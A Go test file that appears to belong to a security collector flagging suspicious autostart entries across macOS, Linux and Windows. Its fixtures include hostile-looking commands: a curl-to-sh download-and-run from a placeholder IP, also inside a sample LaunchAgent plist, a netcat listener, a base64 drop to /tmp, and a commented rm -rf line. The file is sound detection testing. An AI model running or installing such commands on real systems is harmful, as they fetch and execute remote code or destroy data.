package collector

// persistence_test.go —— 开机自启判定的双向测试。
//
// 为什么必须双向：只测「该报的报」会奖励「全判可疑」的实现——把每条规则都
// 改成 return true，测试照样绿。所以每条规则都配一个反例（正常项必须 0 命中），
// 再加一条「顺序钉死」的用例（reasons 数组逐字比对，对拍靠它）。
//
// 平台无关：这里的解析器与判定用例在 darwin / linux / windows 都能跑。
// 依赖平台路径前缀（/Users/ vs /home/）的用例放在 persistence_darwin_test.go。

import (
	"context"
	"reflect"
	"runtime"
	"strings"
	"testing"
	"time"
)

// fakeFS 判定用的假文件系统：只有表里列出的路径「存在」。
type fakeFS map[string]uint32

func (f fakeFS) Stat(p string) (uint32, bool) {
	m, ok := f[p]
	return m, ok
}

func TestSuspicionCleanItems(t *testing.T) {
	cases := []struct {
		name string
		item persistenceItem
	}{
		{
			name: "系统 LaunchDaemon 指向系统二进制",
			item: persistenceItem{
				Kind: "launchd", Path: "/Library/LaunchDaemons/com.apple.x.plist",
				Program: "/usr/libexec/xpcproxy", Command: "/usr/libexec/xpcproxy",
				Scope: "system", RunAtLoad: true, Mode: 0o644, HasMode: true,
			},
		},
		{
			name: "用户 LaunchAgent 指向用户目录里的脚本（正常装法）",
			item: persistenceItem{
				Kind: "launchd", Path: "/Users/xxx/Library/LaunchAgents/ai.x.plist",
				Program: "/Users/xxx/.local/bin/agent.sh",
				Command: "/Users/xxx/.local/bin/agent.sh --serve",
				Scope:   "user", RunAtLoad: true, Mode: 0o644, HasMode: true,
			},
		},
		{
			name: "systemd 的 enabled+Restart=always 不算可疑",
			item: persistenceItem{
				Kind: "systemd", Path: "/etc/systemd/system/nginx.service",
				Program: "/usr/sbin/nginx", Command: "/usr/sbin/nginx -g daemon off;",
				Scope: "system", RunAtLoad: true, KeepAlive: true, Mode: 0o644, HasMode: true,
			},
		},
		{
			name: "cron 每天备份到用户目录",
			item: persistenceItem{
				Kind: "cron", Path: "crontab://user",
				Program: "/usr/bin/python3",
				Command: "/usr/bin/python3 /Users/xxx/.local/bin/backup.py",
				Scope:   "user",
			},
		},
		{
			name: "没有命令行的注册表值（只剩标签，无从判定）",
			item: persistenceItem{
				Kind: "registry-run", Path: "HKCU/SOFTWARE/Microsoft/Windows/CurrentVersion/Run",
				Label: "OneDrive", Scope: "user",
			},
		},
	}
	fs := fakeFS{
		"/usr/libexec/xpcproxy":          0o755,
		"/Users/xxx/.local/bin/agent.sh": 0o755,
		"/usr/sbin/nginx":                0o755,
		"/usr/bin/python3":               0o755,
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := c.item.suspicion(fs); len(got) != 0 {
				t.Fatalf("正常项被误报: %v", got)
			}
		})
	}
}

func TestSuspicionTempProgram(t *testing.T) {
	// 指向 /tmp 且文件已不存在：两条都要报（落地+残留）
	it := persistenceItem{
		Kind: "launchd", Path: "/Users/xxx/Library/LaunchAgents/evil.plist",
		Program: "/tmp/payload.sh", Command: "/tmp/payload.sh",
		Scope: "user", Mode: 0o644, HasMode: true,
	}
	want := []string{reasonCmdToken + "/tmp/", reasonProgTemp, reasonProgMissing}
	if got := it.suspicion(fakeFS{}); !reflect.DeepEqual(got, want) {
		t.Fatalf("got %v, want %v", got, want)
	}

	// 同一个路径但文件存在：prog-missing 不该出现
	it.Command = "/tmp/payload.sh"
	fs := fakeFS{"/tmp/payload.sh": 0o755}
	want = []string{reasonCmdToken + "/tmp/", reasonProgTemp}
	if got := it.suspicion(fs); !reflect.DeepEqual(got, want) {
		t.Fatalf("got %v, want %v", got, want)
	}
}

func TestSuspicionDeletedProgram(t *testing.T) {
	// Python 版没有这条；它对应「开机项指向已删除路径」，是清理痕迹/残留的硬信号
	it := persistenceItem{
		Kind: "launchd", Path: "/Library/LaunchDaemons/com.gone.plist",
		Program: "/Applications/Gone.app/Contents/MacOS/Gone",
		Command: "/Applications/Gone.app/Contents/MacOS/Gone",
		Scope:   "system", Mode: 0o644, HasMode: true,
	}
	if got := it.suspicion(fakeFS{}); !reflect.DeepEqual(got, []string{reasonProgMissing}) {
		t.Fatalf("指向已删除路径没报: %v", got)
	}
}

func TestSuspicionCmdTokens(t *testing.T) {
	fs := fakeFS{"/bin/sh": 0o755, "/usr/bin/curl": 0o755}
	cases := []struct {
		name string
		cmd  string
		want []string
	}{
		{
			name: "curl 管道进 sh",
			cmd:  `/bin/sh -c "curl -fsSL http://203.0.113.9/x.sh | sh"`,
			want: []string{reasonCmdToken + "curl", reasonCmdToken + "/bin/sh -c"},
		},
		{
			name: "python 单行执行",
			cmd:  `/usr/bin/python3 -c "import os;os.system('id')"`,
			want: nil,
		},
		{
			name: "python -c 带空格的形式要命中",
			cmd:  `python -c "import socket"`,
			want: []string{reasonCmdToken + "python -c"},
		},
		{
			name: "osascript 自动化",
			cmd:  "/usr/bin/osascript -e 'do shell script \"id\"'",
			want: []string{reasonCmdToken + "osascript"},
		},
		{
			name: "base64 解码落地",
			cmd:  `/bin/sh -c "echo ZXZpbA== | base64 -d > /tmp/x"`,
			want: []string{reasonCmdToken + "/tmp/", reasonCmdToken + "base64", reasonCmdToken + "/bin/sh -c"},
		},
		{
			name: "共享目录落地",
			cmd:  "/Users/Shared/.hidden/agent",
			want: []string{reasonCmdToken + "/Users/Shared/"},
		},
		{
			name: "词边界：curly 不算 curl",
			cmd:  "/opt/curly/bin/curly --serve",
			want: nil,
		},
		{
			name: "词边界：sync 里的 nc 不算 netcat",
			cmd:  "/usr/bin/rsync --daemon",
			want: nil,
		},
		{
			name: "词边界：/usr/bin/nc 要命中",
			cmd:  "/usr/bin/nc -l 4444",
			want: []string{reasonCmdToken + "nc"},
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			it := persistenceItem{Kind: "cron", Path: "crontab://user", Command: c.cmd, Scope: "user"}
			if got := it.suspicion(fs); !reflect.DeepEqual(got, c.want) {
				t.Fatalf("got %v, want %v", got, c.want)
			}
		})
	}
}

func TestSuspicionReasonOrderStable(t *testing.T) {
	// 一条同时命中 5 类规则的条目：顺序必须是文件头映射表里的顺序，
	// 否则对拍时 reasons 数组逐字比对会失败。
	it := persistenceItem{
		Kind: "launchd", Path: "/tmp/evil.plist",
		Program: "/tmp/x.sh", Command: "/bin/sh -c /tmp/x.sh",
		Scope: "user", RunAtLoad: true, KeepAlive: true,
		Mode: 0o777, HasMode: true,
	}
	want := []string{
		reasonCmdToken + "/tmp/",
		reasonCmdToken + "/bin/sh -c",
		reasonItemTemp,
		reasonPermWide,
		reasonRunKeepAlive,
		reasonProgTemp,
		reasonProgMissing,
	}
	if got := it.suspicion(fakeFS{}); !reflect.DeepEqual(got, want) {
		t.Fatalf("顺序漂了:\n got %v\nwant %v", got, want)
	}
}

func TestSuspicionPermWide(t *testing.T) {
	base := persistenceItem{
		Kind: "launchd", Path: "/Library/LaunchAgents/x.plist",
		Program: "/usr/bin/true", Command: "/usr/bin/true", Scope: "system",
	}
	fs := fakeFS{"/usr/bin/true": 0o755}

	base.Mode, base.HasMode = 0o644, true
	if got := base.suspicion(fs); len(got) != 0 {
		t.Fatalf("0644 不该报: %v", got)
	}
	base.Mode = 0o666
	if got := base.suspicion(fs); !reflect.DeepEqual(got, []string{reasonPermWide}) {
		t.Fatalf("0666 该报: %v", got)
	}
}

func TestSuspicionHiddenDir(t *testing.T) {
	fs := fakeFS{"/Users/xxx/.ssh/payload": 0o755, "/Users/xxx/.local/bin/ok": 0o755}
	it := persistenceItem{
		Kind: "launchd", Path: "/Users/xxx/Library/LaunchAgents/x.plist",
		Program: "/Users/xxx/.ssh/payload", Command: "/Users/xxx/.ssh/payload",
		Scope: "user",
	}
	if got := it.suspicion(fs); !reflect.DeepEqual(got, []string{reasonProgHidden}) {
		t.Fatalf(".ssh 下的可执行文件该报: %v", got)
	}
	// 白名单里的隐藏目录（工具链）不报
	it.Program = "/Users/xxx/.local/bin/ok"
	it.Command = it.Program
	if got := it.suspicion(fs); len(got) != 0 {
		t.Fatalf(".local 是正常工具链，不该报: %v", got)
	}
}

// ---------------------------------------------------------------- plist

const sampleAgentPlist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.example.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://203.0.113.9/p.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<dict>
		<key>SuccessfulExit</key>
		<false/>
	</dict>
	<key>StartInterval</key>
	<integer>30</integer>
	<key>Sockets</key>
	<dict>
		<key>Listener</key>
		<dict>
			<key>SockNodeName</key>
			<string>127.0.0.1</string>
		</dict>
	</dict>
	<key>EnvironmentVariables</key>
	<dict>
		<key>PATH</key>
		<string>/usr/bin:/bin</string>
	</dict>
</dict>
</plist>
`

func TestParsePlistXML(t *testing.T) {
	dict, err := parsePlistXML([]byte(sampleAgentPlist))
	if err != nil {
		t.Fatalf("解析失败: %v", err)
	}
	f := plistFieldsFromDict(dict)
	if f.Label != "com.example.agent" {
		t.Errorf("Label = %q", f.Label)
	}
	if !f.RunAtLoad {
		t.Error("RunAtLoad 应为 true")
	}
	if !f.KeepAlive {
		t.Error("KeepAlive 是 dict（条件保活），应视为真")
	}
	wantArgs := []string{"/bin/sh", "-c", "curl -fsSL http://203.0.113.9/p.sh | sh"}
	if !reflect.DeepEqual(f.Args, wantArgs) {
		t.Errorf("Args = %v", f.Args)
	}
	if f.Program != "/bin/sh" {
		t.Errorf("Program 应回落到 ProgramArguments[0]，得到 %q", f.Program)
	}
}

func TestParsePlistXMLNormalItem(t *testing.T) {
	// 反向用例：正常的 Apple 风格 plist 解析出来不该有任何可疑字段组合
	const clean = `<plist version="1.0"><dict>
	<key>Label</key><string>com.example.clean</string>
	<key>Program</key><string>/usr/libexec/cleanhelper</string>
	<key>RunAtLoad</key><true/>
	<key>KeepAlive</key><false/>
	</dict></plist>`
	dict, err := parsePlistXML([]byte(clean))
	if err != nil {
		t.Fatalf("解析失败: %v", err)
	}
	f := plistFieldsFromDict(dict)
	if f.RunAtLoad != true || f.KeepAlive != false {
		t.Fatalf("布尔字段解析错: %+v", f)
	}
	it := persistenceItem{
		Kind: "launchd", Path: "/Library/LaunchDaemons/com.example.clean.plist",
		Label: f.Label, Program: f.Program, Command: joinCommand(f.Program, f.Args),
		Scope: "system", RunAtLoad: f.RunAtLoad, KeepAlive: f.KeepAlive,
	}
	if got := it.suspicion(fakeFS{"/usr/libexec/cleanhelper": 0o755}); len(got) != 0 {
		t.Fatalf("正常 plist 被误报: %v", got)
	}
}

func TestParsePlistXMLErrors(t *testing.T) {
	if _, err := parsePlistXML([]byte("not a plist")); err == nil {
		t.Fatal("非 plist 内容应当报错")
	}
	if _, err := parsePlistXML([]byte("<plist><array/></plist>")); err == nil {
		t.Fatal("根节点不是 dict 应当报错")
	}
}

// ---------------------------------------------------------------- cron

func TestParseCronLine(t *testing.T) {
	cases := []struct {
		name    string
		line    string
		hasUser bool
		ok      bool
		want    cronEntry
	}{
		{
			name: "用户格式",
			line: "30 4 * * * /usr/bin/python3 /Users/xxx/.local/bin/x.py",
			want: cronEntry{Schedule: "30 4 * * *", Command: "/usr/bin/python3 /Users/xxx/.local/bin/x.py"},
			ok:   true,
		},
		{
			name:    "系统格式带用户列",
			line:    "*/5 * * * * root /usr/local/bin/agent --daemon",
			hasUser: true,
			want:    cronEntry{Schedule: "*/5 * * * *", User: "root", Command: "/usr/local/bin/agent --daemon"},
			ok:      true,
		},
		{
			name: "@reboot",
			line: "@reboot /Users/xxx/.local/bin/boot.sh",
			want: cronEntry{Schedule: "@reboot", Command: "/Users/xxx/.local/bin/boot.sh"},
			ok:   true,
		},
		{
			name: "环境变量行不是任务",
			line: "PATH=/usr/local/bin:/usr/bin:/bin",
			ok:   false,
		},
		{
			name: "注释",
			line: "# 0 3 * * * /bin/rm -rf /",
			ok:   false,
		},
		{
			name: "空行",
			line: "   ",
			ok:   false,
		},
		{
			name: "列数不足",
			line: "0 3 * *",
			ok:   false,
		},
		{
			name:    "系统格式缺命令",
			line:    "0 3 * * * root",
			hasUser: true,
			ok:      false,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, ok := parseCronLine(c.line, c.hasUser)
			if ok != c.ok {
				t.Fatalf("ok = %v, want %v", ok, c.ok)
			}
			if ok && !reflect.DeepEqual(got, c.want) {
				t.Fatalf("got %+v, want %+v", got, c.want)
			}
		})
	}
}

// ---------------------------------------------------------------- systemd

func TestParseSystemdUnit(t *testing.T) {
	const unit = `[Unit]
Description=Telemetry agent
# ExecStart=/usr/bin/legit
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/tmp
ExecStart=/bin/sh -c "/opt/agent/run.sh &"
ExecStart=
ExecStart=/opt/agent/run.sh
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
`
	u := parseSystemdUnit(unit)
	if u.Description != "Telemetry agent" {
		t.Errorf("Description = %q", u.Description)
	}
	// ExecStart= 空赋值会清空前面的赋值（systemd 真实语义）
	if !reflect.DeepEqual(u.Exec, []string{"/opt/agent/run.sh"}) {
		t.Errorf("Exec = %v", u.Exec)
	}
	if u.Restart != "always" || u.User != "root" || u.WorkDir != "/tmp" {
		t.Errorf("字段解析错: %+v", u)
	}
	if !reflect.DeepEqual(u.WantedBy, []string{"multi-user.target"}) {
		t.Errorf("WantedBy = %v", u.WantedBy)
	}
	if got := commandToProgram(u.Exec[0]); got != "/opt/agent/run.sh" {
		t.Errorf("commandToProgram = %q", got)
	}
}

func TestParseSystemdUnitContinuation(t *testing.T) {
	const unit = "[Service]\nExecStart=/usr/bin/agent \\\n  --listen 127.0.0.1:9000 \\\n  --quiet\n"
	u := parseSystemdUnit(unit)
	if len(u.Exec) != 1 || !strings.Contains(u.Exec[0], "--listen") || !strings.Contains(u.Exec[0], "--quiet") {
		t.Fatalf("续行没拼起来: %v", u.Exec)
	}
}

// ---------------------------------------------------------------- windows

const sampleRegQuery = `
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    C:\Windows\system32\SecurityHealthSystray.exe
    Updater          REG_SZ    "C:\Program Files\Vendor\Updater\up.exe" /background

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
    DeletionMarker    REG_SZ    
    Payload           REG_SZ    C:\Users\Public\payload.exe
`

func TestParseRegQuery(t *testing.T) {
	ents := parseRegQuery(sampleRegQuery)
	if len(ents) != 4 {
		t.Fatalf("解析出 %d 条，期望 4: %+v", len(ents), ents)
	}
	if ents[0].Name != "SecurityHealth" || ents[0].Type != "REG_EXPAND_SZ" {
		t.Errorf("第一条: %+v", ents[0])
	}
	if ents[1].Value != `"C:\Program Files\Vendor\Updater\up.exe" /background` {
		t.Errorf("值里的空格被切坏了: %q", ents[1].Value)
	}
	if ents[3].Key != `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` {
		t.Errorf("键跟随错: %q", ents[3].Key)
	}
	// 值 → 程序路径
	if got := commandToProgram(ents[1].Value); got != `C:\Program Files\Vendor\Updater\up.exe` {
		t.Errorf("带引号路径解析错: %q", got)
	}
	if got := commandToProgram(ents[3].Value); got != `C:\Users\Public\payload.exe` {
		t.Errorf("裸路径解析错: %q", got)
	}
}

const sampleSchtasksCSV = `"HostName","TaskName","Next Run Time","Status","Logon Mode","Last Run Time","Last Result","Author","Task To Run","Start In","Comment","Scheduled Task State","Idle Time","Power Management","Run As User","Delete Task If Not Rescheduled","Stop Task If Runs X Hours and X Mins","Schedule Type","Start Time","Start Date","End Date","Days","Months","Repeat: Every","Repeat: Until: Time","Repeat: Until: Duration","Repeat: Stop If Still Running","Idle","Task To Run"
"HOST","\Microsoft\Windows\Defrag\ScheduledDefrag","N/A","Ready","Interactive/Background","11/19/2026 3:00:00","0","Microsoft","%windir%\system32\defrag.exe","N/A","","Enabled","","","SYSTEM","Disabled","72:00:00","Weekly","2:00:00","11/1/2026","N/A","MON","N/A","N/A","N/A","N/A","N/A","",""
"HOST","\UpdaterTask","N/A","Ready","Interactive","11/19/2026 4:00:00","0","CORP\xxx","C:\Users\xxx\AppData\Roaming\up\up.exe /silent","N/A","","Enabled","","","xxx","Disabled","72:00:00","At logon time","N/A","11/1/2026","N/A","N/A","N/A","N/A","N/A","N/A","N/A","",""
`

func TestParseSchtasksCSV(t *testing.T) {
	tasks := parseSchtasksCSV(sampleSchtasksCSV)
	if len(tasks) != 2 {
		t.Fatalf("解析出 %d 条，期望 2: %+v", len(tasks), tasks)
	}
	if tasks[0].Name != `\Microsoft\Windows\Defrag\ScheduledDefrag` {
		t.Errorf("任务名: %q", tasks[0].Name)
	}
	if tasks[1].Run != `C:\Users\xxx\AppData\Roaming\up\up.exe /silent` {
		t.Errorf("要运行的任务: %q", tasks[1].Run)
	}
	if tasks[1].Schedule != "At logon time" || tasks[1].Status != "Ready" {
		t.Errorf("字段: %+v", tasks[1])
	}
}

func TestParseSchtasksCSVLocalizedHeader(t *testing.T) {
	// 中文系统上 schtasks 的列名是本地化的，不能只认英文表头
	csvText := `"主机名","任务名","下次运行时间","状态","登录模式","上次运行时间","上次结果","创建者","要运行的任务","开始于"
"HOST","\Evil","N/A","就绪","交互式","N/A","0","CORP\xxx","C:\Users\Public\e.exe","N/A"
`
	tasks := parseSchtasksCSV(csvText)
	if len(tasks) != 1 {
		t.Fatalf("中文表头没解析出来: %+v", tasks)
	}
	if tasks[0].Name != `\Evil` || tasks[0].Run != `C:\Users\Public\e.exe` {
		t.Fatalf("%+v", tasks[0])
	}
}

func TestParseSchtasksCSVJunk(t *testing.T) {
	if got := parseSchtasksCSV("错误: 无法找到指定的任务。"); got != nil {
		t.Fatalf("错误信息被当成任务表: %+v", got)
	}
}

func TestCommandToProgram(t *testing.T) {
	cases := []struct{ in, want string }{
		{`"C:\Program Files\A\a.exe" -k`, `C:\Program Files\A\a.exe`},
		{`C:\Program Files\A\a.exe -k`, `C:\Program Files\A\a.exe`},
		{`C:\Tools\b.exe`, `C:\Tools\b.exe`},
		{`/usr/bin/python3 -m http.server`, `/usr/bin/python3`},
		{`rundll32.exe`, `rundll32.exe`},
		{`C:\x\a.bat /q`, `C:\x\a.bat`},
		{``, ``},
	}
	for _, c := range cases {
		if got := commandToProgram(c.in); got != c.want {
			t.Errorf("commandToProgram(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// Windows 的判定在 macOS 上也要能测：winTempPath / winUserBinaryPath 是
// 平台无关的纯函数（persistence_parse.go），这里直接喂 Windows 路径。
func TestWinPathPredicates(t *testing.T) {
	temp := []struct {
		p    string
		want bool
	}{
		{`C:\Windows\Temp\payload.exe`, true},
		{`C:\Users\xxx\AppData\Local\Temp\a\b.exe`, true},
		{`C:\Temp\x.exe`, true},
		{`C:\Users\Public\p.exe`, true},
		{`C:\Program Files\Vendor\app.exe`, false},
		{`C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe`, false},
	}
	for _, c := range temp {
		if got := winTempPath(c.p); got != c.want {
			t.Errorf("winTempPath(%q) = %v, want %v", c.p, got, c.want)
		}
	}

	user := []struct {
		p    string
		want bool
	}{
		{`C:\Users\xxx\AppData\Roaming\up\up.exe`, true},
		{`C:/Users/xxx/prog.exe`, true},
		{`C:\Program Files\Vendor\app.exe`, false},
		{`C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe`, false},
		{`C:\Windows\System32\cmd.exe`, false},
	}
	for _, c := range user {
		if got := winUserBinaryPath(c.p); got != c.want {
			t.Errorf("winUserBinaryPath(%q) = %v, want %v", c.p, got, c.want)
		}
	}
}

func TestSuspicionWindowsRegistry(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("suspicion() 里的路径谓词按平台编译；三平台的路径语义已由 TestWinPathPredicates 覆盖")
	}
	const hklmRun = `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	fs := fakeFS{
		`C:\Program Files\Vendor\app.exe`: 0o755,
	}

	// 反向：HKLM 指向 Program Files 里的正规程序 → 不报
	clean := persistenceItem{
		Kind: "registry-run", ID: hklmRun + `\Vendor`, Path: hklmRun,
		Label: "Vendor", Program: `C:\Program Files\Vendor\app.exe`,
		Command: `"C:\Program Files\Vendor\app.exe" /background`, Scope: "system",
	}
	if got := clean.suspicion(fs); len(got) != 0 {
		t.Fatalf("正规安装被误报: %v", got)
	}

	// 该报：HKLM（系统级）指向用户可写目录 → 提权持久化
	evil := clean
	evil.Program = `C:\Users\xxx\AppData\Roaming\up\up.exe`
	evil.Command = evil.Program
	if got := evil.suspicion(fs); !reflect.DeepEqual(got, []string{reasonProgMissing, reasonRootUserBin}) {
		t.Fatalf("HKLM 指向用户目录没报全: %v", got)
	}

	// 该报：HKCU 值指向 Temp 里的程序（用户级不算提权，但落地位置可疑）
	user := clean
	user.Scope = "user"
	user.Program = `C:\Windows\Temp\payload.exe`
	user.Command = user.Program
	if got := user.suspicion(fakeFS{}); !reflect.DeepEqual(got, []string{reasonProgTemp, reasonProgMissing}) {
		t.Fatalf("Temp 里的自启项没报全: %v", got)
	}
}

func TestSuspicionWindowsScheduledTask(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("同上：平台谓词只在 windows 上生效")
	}
	task := persistenceItem{
		Kind: "scheduled-task", ID: "schtask:\\updater", Path: `\SchTasks`,
		Label: `\Updater`, Scope: "system",
		Command: `C:\Users\xxx\AppData\Roaming\up\up.exe /silent`,
	}
	task.Program = commandToProgram(task.Command)
	if task.Program != `C:\Users\xxx\AppData\Roaming\up\up.exe` {
		t.Fatalf("任务命令行解析错: %q", task.Program)
	}
	got := task.suspicion(fakeFS{})
	if !reflect.DeepEqual(got, []string{reasonProgMissing, reasonRootUserBin}) {
		t.Fatalf("计划任务判定: %v", got)
	}
}

// ---------------------------------------------------------------- 采集器差分

func newTestPersistence(src func(context.Context) ([]persistenceItem, error)) *Persistence {
	p := &Persistence{known: map[string]persistenceItem{}, source: src}
	p.Init("persistence", ModePoll, time.Minute, nil)
	return p
}

func item(id, program, command string) persistenceItem {
	return persistenceItem{
		Kind: "launchd", ID: id, Path: "/Library/LaunchAgents/" + id,
		Label: id, Program: program, Command: command, Scope: "user",
		Mode: 0o644, HasMode: true, MTime: 1700000000,
	}
}

func TestCollectorSeedsBaselineWithoutNoise(t *testing.T) {
	clean := item("com.a.plist", "/usr/bin/true", "/usr/bin/true")
	p := newTestPersistence(func(context.Context) ([]persistenceItem, error) {
		return []persistenceItem{clean}, nil
	})
	evs, err := p.Collect(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	// 首轮只建基线：正常的开机项一条事件都不该出（否则 1000 条全是噪音）
	if len(evs) != 0 {
		t.Fatalf("首轮不该出事件，得到 %d 条: %+v", len(evs), evs)
	}
	if p.Items() != 1 {
		t.Fatalf("Items() = %d", p.Items())
	}
}

func TestCollectorFirstRunReportsSuspicious(t *testing.T) {
	// 与 Python 版的有意差异：首轮对「已可疑」的条目要出一枪，
	// 否则 --once 跑一次永远零输出，审计场景等于没跑。
	evil := item("com.evil.plist", "/tmp/x.sh", "/bin/sh -c /tmp/x.sh")
	p := newTestPersistence(func(context.Context) ([]persistenceItem, error) {
		return []persistenceItem{evil}, nil
	})
	evs, err := p.Collect(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if len(evs) != 1 || evs[0].Kind != EventPersistenceSuspicious {
		t.Fatalf("首轮可疑项没报: %+v", evs)
	}
	if evs[0].Severity != "high" {
		t.Fatalf("severity = %q", evs[0].Severity)
	}
	reasons, _ := evs[0].Subject["reasons"].([]string)
	if len(reasons) < 3 {
		t.Fatalf("reasons 不全: %v", reasons)
	}
}

func TestCollectorAddAfterSeed(t *testing.T) {
	clean := item("com.a.plist", "/usr/bin/true", "/usr/bin/true")
	evil := item("com.new.plist", "/tmp/x.sh", "/bin/sh -c /tmp/x.sh")
	var cur []persistenceItem
	p := newTestPersistence(func(context.Context) ([]persistenceItem, error) {
		return append([]persistenceItem(nil), cur...), nil
	})

	cur = []persistenceItem{clean}
	if evs, _ := p.Collect(context.Background()); len(evs) != 0 {
		t.Fatalf("首轮不该出事件: %+v", evs)
	}

	// 第二轮多了一条指向 /tmp 的：必须报 add，且 severity 抬到 high
	cur = []persistenceItem{clean, evil}
	evs, _ := p.Collect(context.Background())
	if len(evs) != 1 || evs[0].Kind != EventPersistenceAdd {
		t.Fatalf("新增项没报: %+v", evs)
	}
	if evs[0].Severity != "high" {
		t.Fatalf("可疑新增 severity = %q", evs[0].Severity)
	}
	if id, _ := evs[0].Subject["id"].(string); id != "com.new.plist" {
		t.Fatalf("subject.id = %v", evs[0].Subject["id"])
	}

	// 第三轮没变化：不能重复报（轮询每 60s 一轮，重复报等于刷屏）
	evs, _ = p.Collect(context.Background())
	if len(evs) != 0 {
		t.Fatalf("无变化却又出事件: %+v", evs)
	}
}

func TestCollectorCleanAddIsLow(t *testing.T) {
	clean := item("com.a.plist", "/usr/bin/true", "/usr/bin/true")
	fresh := item("com.b.plist", "/usr/bin/true", "/usr/bin/true")
	var cur []persistenceItem
	p := newTestPersistence(func(context.Context) ([]persistenceItem, error) { return cur, nil })
	cur = []persistenceItem{clean}
	_, _ = p.Collect(context.Background())
	cur = []persistenceItem{clean, fresh}
	evs, _ := p.Collect(context.Background())
	if len(evs) != 1 || evs[0].Severity != "low" {
		t.Fatalf("正常新增应当 low: %+v", evs)
	}
}

func TestCollectorModifyByCommandHash(t *testing.T) {
	// 注册表值没有可信 mtime，靠命令行指纹发现「值被改」
	reg := persistenceItem{
		Kind: "registry-run", ID: "HKCU/Run/Updater", Path: "HKCU/Run",
		Label: "Updater", Program: "/usr/bin/true", Command: "/usr/bin/true", Scope: "user",
	}
	var cur persistenceItem
	p := newTestPersistence(func(context.Context) ([]persistenceItem, error) {
		return []persistenceItem{cur}, nil
	})
	cur = reg
	_, _ = p.Collect(context.Background())

	cur = reg
	cur.Command = "/usr/bin/true --new-arg"
	evs, _ := p.Collect(context.Background())
	if len(evs) != 1 || evs[0].Kind != EventPersistenceModify {
		t.Fatalf("命令行变了没报 modify: %+v", evs)
	}
}

func TestCollectorSuspicionEscalation(t *testing.T) {
	// 命令一个字节都没改，但可执行文件从磁盘上消失了（清理痕迹 / 挂载点被卸载）。
	// 这种「判定集合变化」必须单独出一枪，否则攻击者只要不碰 plist 就隐身。
	it := item("com.a.plist", "/opt/agent/run", "/opt/agent/run")
	fs := fakeFS{"/opt/agent/run": 0o755}
	p := newTestPersistence(func(context.Context) ([]persistenceItem, error) {
		return []persistenceItem{it}, nil
	})
	p.probe = fs

	if evs, _ := p.Collect(context.Background()); len(evs) != 0 {
		t.Fatalf("首轮正常项不该出事件: %+v", evs)
	}
	delete(fs, "/opt/agent/run") // 文件没了，条目本身原样
	evs, _ := p.Collect(context.Background())
	if len(evs) != 1 || evs[0].Kind != EventPersistenceSuspicious {
		t.Fatalf("判定升级没报: %+v", evs)
	}
	if got, _ := evs[0].Subject["reasons"].([]string); !reflect.DeepEqual(got, []string{reasonProgMissing}) {
		t.Fatalf("reasons = %v", got)
	}
}

func TestCollectorRemove(t *testing.T) {
	// 开机项被删掉（攻击者关防护/清痕迹）也必须可见
	a := item("com.a.plist", "/usr/bin/true", "/usr/bin/true")
	b := item("com.b.plist", "/usr/bin/true", "/usr/bin/true")
	var cur []persistenceItem
	p := newTestPersistence(func(context.Context) ([]persistenceItem, error) {
		return append([]persistenceItem(nil), cur...), nil
	})
	cur = []persistenceItem{a, b}
	_, _ = p.Collect(context.Background())
	cur = []persistenceItem{a}
	evs, _ := p.Collect(context.Background())
	if len(evs) != 1 || evs[0].Kind != EventPersistenceRemove {
		t.Fatalf("删除没报: %+v", evs)
	}
	if id, _ := evs[0].Subject["id"].(string); id != "com.b.plist" {
		t.Fatalf("删错条目: %v", evs[0].Subject["id"])
	}
	// 再跑一轮不能重复报
	if evs, _ := p.Collect(context.Background()); len(evs) != 0 {
		t.Fatalf("删除被重复报: %+v", evs)
	}
}

func TestCollectorDeterministicOrder(t *testing.T) {
	// 事件顺序必须确定（按 ID 排序），否则对拍时顺序不稳定
	var cur []persistenceItem
	p := newTestPersistence(func(context.Context) ([]persistenceItem, error) { return cur, nil })
	cur = []persistenceItem{item("z.plist", "/usr/bin/true", "/usr/bin/true")}
	_, _ = p.Collect(context.Background())
	cur = []persistenceItem{
		item("z.plist", "/usr/bin/true", "/usr/bin/true"),
		item("m.plist", "/tmp/m", "/tmp/m"),
		item("a.plist", "/tmp/a", "/tmp/a"),
	}
	evs, _ := p.Collect(context.Background())
	if len(evs) != 2 {
		t.Fatalf("期望 2 条新增: %+v", evs)
	}
	if id0, _ := evs[0].Subject["id"].(string); id0 != "a.plist" {
		t.Fatalf("顺序不对: %v", evs[0].Subject["id"])
	}
	if id1, _ := evs[1].Subject["id"].(string); id1 != "m.plist" {
		t.Fatalf("顺序不对: %v", evs[1].Subject["id"])
	}
}
